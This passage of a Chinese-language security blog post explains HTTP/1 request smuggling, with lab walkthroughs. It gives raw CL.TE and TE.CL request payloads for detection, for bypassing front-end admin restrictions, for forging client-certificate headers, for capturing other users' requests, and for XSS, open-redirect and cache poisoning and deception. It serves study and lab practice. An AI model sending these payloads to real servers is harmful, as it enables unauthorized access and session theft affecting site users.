+<p>​	# 计时技术</p>
+<ul>
+<li><p>利用计时技术发现CL.TE漏洞</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><br><span class="language-css"><span class="hljs-number">1</span></span><br><span class="language-css"><span class="hljs-selector-tag">A</span></span><br><span class="language-css"><span class="hljs-attribute">X</span></span><br></code></pre></td></tr></table></figure>
+
+<p>让正文长度大于CL长度，此时前端仅收录一部分，后端因为采用TE处理，要一直等待后续请求包，直到完整的一块才终止</p>
+</li>
+<li><p>利用计时技术发现TE.CL漏洞</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>6<br><br><span class="language-css"><span class="hljs-number">0</span></span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-attribute">X</span>\<span class="hljs-attribute">r</span>\n</span><br><span class="language-css">\<span class="hljs-attribute">r</span>\n</span><br></code></pre></td></tr></table></figure>
+
+<p>前端处理TE，但开始就遇到<code>0\r\n\r\n</code>（表示结束），直接丢弃X发给后端，后端用CL，要6个字节长度内容才会终止，等不到就一直等，直到响应超时</p>
+</li>
+</ul>
+<p>值得注意的是如果应用程序可能受到CL.TE攻击，那么针对TE.CL漏洞的利用计时技术的测试可能会干扰其他应用程序用户。因此，要保持隐蔽并最大程度地减少超时现象，应该首先使用CL.TE测试，只有在第一次测试不成功时才继续进行TE.CL测试。</p>
+<p>​	# 确认漏洞</p>
+<p>​	连续快速的发送两次请求，第一个是魔改的请求包，第二个是正常的请求，这样就能用第一个请求干扰后端服务器对第二个请求包的处理</p>
+<ul>
+<li><h3 id="使用差异响应确认-CL-TE-漏洞"><a href="#使用差异响应确认-CL-TE-漏洞" class="headerlink" title="使用差异响应确认 CL.TE 漏洞"></a>使用差异响应确认 CL.TE 漏洞</h3><p>（可见实验4）</p>
+<p>发送</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/search</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>49<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-routeros">e</span><br><span class="language-routeros"><span class="hljs-attribute">q</span>=smuggling&amp;x=</span><br><span class="language-routeros">0</span><br><span class="language-routeros"></span><br><span class="language-routeros"><span class="hljs-built_in">GET</span> /404 HTTP/1.1</span><br><span class="language-routeros">Foo: x</span><br></code></pre></td></tr></table></figure>
+
+<p>如果攻击成功，后端服务器会将此请求的最后两行视为下一个收到的请求。这将导致后续的“正常”请求看起来像这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>xPOST /search HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-abnf"><span class="hljs-attribute">q</span><span class="hljs-operator">=</span>smuggling</span><br></code></pre></td></tr></table></figure>
+
+<p>由于此请求现在包含无效的 URL，服务器将以状态码 404 进行响应，表明攻击请求确实干扰了服务器。</p>
+</li>
+<li><h3 id="使用差异响应确认-TE-CL-漏洞"><a href="#使用差异响应确认-TE-CL-漏洞" class="headerlink" title="使用差异响应确认 TE.CL 漏洞"></a>使用差异响应确认 TE.CL 漏洞</h3><p>（可见实验5）</p>
+<p>要确认 TE.CL 是否存在漏洞，您可以发送如下攻击请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/search</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">7</span>c</span><br><span class="language-nix">GET <span class="hljs-symbol">/404</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">144</span>（<span class="hljs-operator">&gt;</span>内层body字节数即可）</span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">x</span><span class="hljs-operator">=</span></span><br><span class="language-nix"><span class="hljs-number">0</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果攻击成功，<code>GET /404</code>后端服务器会将之后的所有内容都视为下一个收到的请求。这将导致后续的“正常”请求看起来像这样：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/404</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>146<br><br><span class="language-nix">x<span class="hljs-operator">=</span></span><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">POST <span class="hljs-symbol">/search</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">11</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">q</span><span class="hljs-operator">=</span>smuggling</span><br></code></pre></td></tr></table></figure>
+
+<p>由于此请求现在包含无效的 URL，服务器将以状态码 404 进行响应，表明攻击请求确实干扰了服务器。</p>
+</li>
+</ul>
+<h2 id="5-漏洞利用"><a href="#5-漏洞利用" class="headerlink" title="5.漏洞利用"></a>5.漏洞利用</h2><h3 id="1-绕过前端WAF"><a href="#1-绕过前端WAF" class="headerlink" title="1.  绕过前端WAF"></a>1.  绕过前端WAF</h3><p>（见实验6,7）</p>
+<p><strong>因为请求走私能把部分数据直接送到后端，所以能绕过前端部分WAF</strong></p>
+<p>在某些web应用，前端存在部分WAF，通过前端WAF的才会发到后端服务器，比如访问控制限制.</p>
+<p>假设当前用户被允许访问某个资源<code>/home</code>，但没有被允许访问<code>/admin</code>其他资源。他们可以使用以下请求走私攻击（拼接结果）绕过此限制：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/home</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>62<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/admin</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> xGET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br></code></pre></td></tr></table></figure>
+
+<p>两个包中，前端都是访问home，但后端拼接了一个访问admin。有时候想修改host，就需要修改截断部分用内侧CL形成覆盖</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101185424078.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-揭示前端请求重写-4"><a href="#2-揭示前端请求重写-4" class="headerlink" title="2. 揭示前端请求重写   &#x3D;&#x3D;&gt;4"></a>2. 揭示前端请求重写   &#x3D;&#x3D;&gt;4</h3><p>（实验室8）</p>
+<p>在许多应用中，前端服务器会在将请求转发到后端服务器之前对其进行一些重写，通常是通过添加一些额外的请求头。例如，前端服务器可能会：</p>
+<ul>
+<li>终止 TLS 连接，并添加一些描述所用协议和密码的标头；</li>
+<li>添加<code>X-Forwarded-For</code>包含用户 IP 地址的标头；</li>
+<li>根据用户的会话令牌确定用户的 ID，并添加一个标识用户的标头；或者</li>
+<li>添加一些其他攻击者感兴趣的敏感信息。</li>
+</ul>
+<p>那为了找出传输中偷偷加的header，就要想办法把整个包回显。</p>
+<p>通常的思路：找到普通页面中，能反射用户输入的地方，例如输入 <code>email=yjh@a.com</code>，相应中反射<code>&lt;input id=&quot;email&quot; value=&quot;yjh@a.com&quot; type=&quot;text&quot;&gt;</code></p>
+<p>那就可以用这个参数做外带工具，把正常包拼接到<code>email</code>参数：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>130<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span></span><br><span class="language-nix"><span class="hljs-params">Content-Length:</span> <span class="hljs-number">100</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">email</span><span class="hljs-operator">=</span>POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> vulnerable-website.com</span><br><span class="language-nix">...</span><br></code></pre></td></tr></table></figure>
+
+<p>由于重写包的长度不可知，所以要猜内层CL大小，<code>内层body长度</code>&lt;<code>内层CL值</code>&lt;<code>拼接后的整个body长度</code></p>
+<p>实例：</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101193622057.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-绕过客户端身份验证（authentication）"><a href="#3-绕过客户端身份验证（authentication）" class="headerlink" title="3. 绕过客户端身份验证（authentication）"></a>3. 绕过客户端身份验证（authentication）</h3><p>有些网站有双向TLS认证，客户端的CN（通用名称）通常是用户名或其他类似信息，有时候在后端应用程序逻辑中用作访问控制机制的一部分。</p>
+<p>用于验证客户端身份的组件通常会通过一个或多个非标准 HTTP 标头，将证书中的相关详细信息传递给应用程序或后端服务器。例如，前端服务器有时会将包含客户端 CN 的标头附加到任何传入的请求中：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>normal-website.com<br><span class="hljs-attribute">X-SSL-CLIENT-CN</span><span class="hljs-punctuation">: </span>carlos<br></code></pre></td></tr></table></figure>
+
+<p>正常情况下，攻击者成功构造这个头就可以，但前端会覆盖你的构造，但用HTTP走私就绕过了前端的覆盖，原理就和1的绕过前端WAF差不多</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>64<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/admin</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">X-SSL-CLIENT-CN:</span> administrator</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> x</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-捕获其他用户的请求-2"><a href="#4-捕获其他用户的请求-2" class="headerlink" title="4.捕获其他用户的请求    &#x3D;&#x3D;&gt;2"></a>4.捕获其他用户的请求    &#x3D;&#x3D;&gt;2</h3><p>（实验9）</p>
+<p>这个点和第二点有点像，第二点是带出隐藏<code>Header</code>，这个就是带出其他用户请求中的敏感数据（其实有时候也是<code>Header</code>，比如<code>cookie</code>）。控制带出的关键就是调整内层CL的长度</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101215032189.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="5-走私触发反射型-XSS"><a href="#5-走私触发反射型-XSS" class="headerlink" title="5. 走私触发反射型 XSS"></a>5. 走私触发反射型 XSS</h3><p>（实验10）</p>
+<p>利用请求走私利用反射XSS比直接利用反射XSS更有优势：</p>
+<ul>
+<li>它不需要受害者交互。你不需要向他们提供URL并等待他们访问。你只需偷偷发送一个包含XSS有效载荷的请求，后端服务器处理的下一个用户请求就会被攻击。</li>
+<li>它可以利用请求中那些在普通反射型 XSS 攻击中难以轻易控制的部分（例如 HTTP 请求头）的 XSS 行为。</li>
+</ul>
+<p>例如UA存在XSS，但你控制不了受害者的UA，你用请求走私就能定制受害者的<code>Header</code></p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251101222050650.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="6-将根相对重定向转换为开放重定向"><a href="#6-将根相对重定向转换为开放重定向" class="headerlink" title="6. 将根相对重定向转换为开放重定向"></a>6. 将根相对重定向转换为开放重定向</h3><p>我们常见的重定向是对<code>路径</code>和<code>Host</code>的结合处理，有些服务器框架对不带尾部斜杠的文件夹的请求会被重定向到包含尾部斜杠的同一文件夹。例如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>normal-website.com<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">301</span> Moved Permanently</span><br><span class="language-http"><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://normal-website.com/home/</span><br></code></pre></td></tr></table></figure>
+
+<p>那就可以在这里利用<strong>走私攻击</strong>，将其他用户重定向到外部域。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>54<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> attacker-website.com</span><br><span class="language-nix"><span class="hljs-params">Foo:</span> X</span><br></code></pre></td></tr></table></figure>
+
+<p>此处，用户请求的是一个由网站页面导入的 JavaScript 文件。攻击者可以通过在响应中返回自己的 JavaScript 文件来完全控制受害者用户。</p>
+<h3 id="7-进行Web缓存投毒"><a href="#7-进行Web缓存投毒" class="headerlink" title="7. 进行Web缓存投毒"></a>7. 进行Web缓存投毒</h3><p>（实验11）</p>
+<p>在普通的 <a href="https://i4g5d.github.io/2025/10/19/web-cache2/">Cache投毒</a>中，我们要做的就是利用cache rules&#x2F;key上漏洞，利用Cache rules不包含（及不会写入key）的注入点（各种header的忽略，参数上的解析差异等 就是所谓的非密钥输入），直接在缓存中写入DOM或者导入含毒的静态文件</p>
+<p>但如果能利用<strong>请求走私</strong>，结合前面的重定向攻击，就可以把某个静态文件的缓存机制给重定向用</p>
+<ul>
+<li><p>构造魔改包，走私一个会重定向的请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Host:</span> attacker-website.com</span><br><span class="language-nix"><span class="hljs-params">CL:</span> <span class="hljs-number">10</span></span><br><span class="language-nix"></span><br><span class="language-nix"><span class="hljs-attr">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>发一个有Cache机制的静态文件正常包，会与魔改包拼接</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">GET <span class="hljs-symbol">/home</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> attacker-website.com<br>CL：<span class="hljs-number">10</span><br><br><span class="hljs-attr">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>GET <span class="hljs-symbol">/static/include.js</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> vulnerable-website.com<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>写入了重定向缓存</p>
+</li>
+<li><p>受害者访问这个静态文件包，就会读到重定向缓存</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/include.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><br><span class="language-http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">301</span> Moved Permanently</span><br><span class="language-http"><span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://attacker-website.com/home/</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="8-利用-HTTP-请求走私进行-Web-缓存欺骗"><a href="#8-利用-HTTP-请求走私进行-Web-缓存欺骗" class="headerlink" title="8. 利用 HTTP 请求走私进行 Web 缓存欺骗"></a>8. 利用 HTTP 请求走私进行 Web 缓存欺骗</h3><p>(实验12)</p>
+<p>普通的<a href="https://i4g5d.github.io/2025/10/15/web-cache/">Cache欺骗</a>是通过Cache端和源对cache rules的解析差异（有静态文件尾缀就缓存，有静态目录就缓存），让本该是动态文件的内容被Cache端解析为符合Cache rules的文件写入缓存，然后攻击者读缓存获取敏感数据</p>
+<p>但加入<strong>请求走私</strong>就可以</p>
+<ul>
+<li><p>构造魔改包，让敏感文件拼接上静态文件，</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>43<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/private/messages</span> HTTP<span class="hljs-symbol">/1.1</span></span><br><span class="language-nix"><span class="hljs-params">Foo:</span> X</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>受害者原本写入静态文件缓存结果魔改到了敏感界面，敏感文件数据被写入了的缓存，（Cache中间件解析的是png，所以确定请求包回来后要缓存，但后端收到的请求却是message，返回的就是message）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/private/messages</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>XGET /static/some-image.png HTTP/1.1<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z<br>...<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>随后访问一下static&#x2F;some-image.png就能读到API</p>
+</li>
+</ul>
+<h2 id="6-实验"><a href="#6-实验" class="headerlink" title="6.实验"></a>6.实验</h2><h3 id="实验1：CL-TE-基本漏洞"><a href="#实验1：CL-TE-基本漏洞" class="headerlink" title="实验1：CL.TE 基本漏洞"></a>实验1：CL.TE 基本漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031211910914.png" srcset="/img/loading.gif" lazyload></p>
+<p>做题前两个细节,一个<code>HTTP/2</code>换成<code>HTTP/1</code>,一个关掉Repeater的自动补齐CL</p>
+<p>按要求就是利用前端使用CL，后端使用TE，截断第一个包，让第二个包的请求头变成YPOST</p>
+<p>那就这么构造第一个包</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031213517814.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里开启了换行显示，因为<code>\r\n</code>算两个字节。</p>
+<p>这样前端从0到G刚好是6字节，但后端第一个http包到0就结束了。</p>
+<p>这时第一次发包是正常的，再发一次，看到G和POST结合了</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031213546270.png" srcset="/img/loading.gif" lazyload></p>
+<p>前端服务器处理请求<code>Content-Length</code>头，并确定请求体长度为 6 字节，直到末尾<code>G</code>。该请求被转发到后端服务器。</p>
+<p>后端服务器处理<code>Transfer-Encoding</code>头部信息，因此会将消息体视为使用分块编码。它会处理第一个长度为零的块，并将其视为请求的结束。接下来的字节（<code>G</code>）则不予处理，后端服务器会将它们视为序列中下一个请求的开始。</p>
+<h3 id="实验2：TE-CL-基本漏洞"><a href="#实验2：TE-CL-基本漏洞" class="headerlink" title="实验2：TE.CL 基本漏洞"></a>实验2：TE.CL 基本漏洞</h3><p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031214938148.png" srcset="/img/loading.gif" lazyload></p>
+<p>最开始先尝试构造,成功访问.按理说就是前端发送了所有,后端截取到G前面</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031233209915.png" srcset="/img/loading.gif" lazyload></p>
+<p>随后再发送一个新包,发现是能拼接的,但多了一个0</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031233307567.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样至少说明TE.CL初步成功了,想办法构造成GPOST,直接构造一个新请求</p>
+<p>第一次发</p>
+<p><img src="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251031234422394.png" srcset="/img/loading.gif" lazyload></p>
+<p>再发第二个包,这其实已经成功了,但第二个包会200,因为不会和后面的包拼接,后面的包会正常发送(后端是靠CL分割的),等于我们发了第二个包的时候后端分割出了三个</p>
+<p>所以在内层加个CL头,CL的值不能是刚刚好,因为要让后面的正常请求拼接上触发报错</p>
+<p>第一个发送包 CL值改为5+1</p>
